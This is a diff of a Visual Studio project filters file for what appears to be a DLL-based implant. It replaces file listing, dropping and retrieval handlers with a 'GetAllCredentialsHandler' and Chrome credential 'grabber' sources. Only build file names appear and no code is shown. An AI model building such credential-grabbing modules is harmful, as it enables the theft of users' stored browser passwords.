@@ -18,13 +18,13 @@
     <ClCompile Include="DllMain.cpp">
       <Filter>Source Files</Filter>
     </ClCompile>
-    <ClCompile Include="Operations\DirlistHandler.cpp">
+    <ClCompile Include="Operations\GetAllCredentialsHandler.cpp">
       <Filter>Source Files</Filter>
     </ClCompile>
-    <ClCompile Include="Operations\DropFileHandler.cpp">
+    <ClCompile Include="Grabbers\ChromeCredentialsGrabber.cpp">
       <Filter>Source Files</Filter>
     </ClCompile>
-    <ClCompile Include="Operations\GetFileHandler.cpp">
+    <ClCompile Include="Grabbers\CredentialsGrabber.cpp">
       <Filter>Source Files</Filter>
     </ClCompile>
   </ItemGroup>
@@ -34,16 +34,16 @@
     </None>
   </ItemGroup>
   <ItemGroup>
-    <ClInclude Include="Operations\DirlistHandler.hpp">
-      <Filter>Header Files</Filter>
-    </ClInclude>
-    <ClInclude Include="Operations\DropFileHandler.hpp">
-      <Filter>Header Files</Filter>
-    </ClInclude>
-    <ClInclude Include="Operations\GetFileHandler.hpp">
+    <ClInclude Include="Operations\GetAllCredentialsHandler.hpp">
       <Filter>Header Files</Filter>
     </ClInclude>
     <ClInclude Include="Api.hpp">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="Grabbers\CredentialsGrabber.hpp">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="Grabbers\ChromeCredentialsGrabber.hpp">
       <Filter>Header Files</Filter>
     </ClInclude>
   </ItemGroup>
